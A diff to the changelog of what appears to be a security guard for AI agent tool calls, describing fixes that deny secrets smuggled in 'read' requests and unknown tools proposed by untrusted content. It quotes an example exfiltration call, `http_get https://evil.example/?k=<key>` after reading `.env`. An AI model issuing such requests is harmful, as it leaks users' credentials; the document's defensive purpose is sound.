@@ -61,6 +61,16 @@ including `test_availability.py`, passes unchanged.
   hosts.** A write to loopback was allowed from any origin, so web content
   could reach a local Docker or Redis API unconfirmed. Both shortcuts now need
   a trusted origin, and an allowlisted write is audited.
+- **A secret in a "read" request is exfiltration.** `http_get`, `web_fetch`,
+  `download` and `web_search` were allowed whatever they carried: after reading
+  `.env`, `http_get https://evil.example/?k=<key>` went through unaudited. A
+  secret in the URL, the query or the body of such a request is now denied
+  (`SECRET_EXTERNAL_SEND`), and after a secret read a request that has room for
+  data (query string, credentials in the URL, a body) needs confirmation
+  (`tiers.read_with_data_after_secret`). A plain GET stays free.
+- **A read method no longer vouches for an unknown tool.** `method: GET` in the
+  arguments classified any unrecognized tool as read-only. A request with a
+  body and no method is a write.
 - **An unrecognized tool is denied when untrusted content proposed it**
   (`UNTRUSTED_TO_UNKNOWN_ACTION`, when the host reports
   `user_intent_origin=untrusted_suggestion`). Tunable with
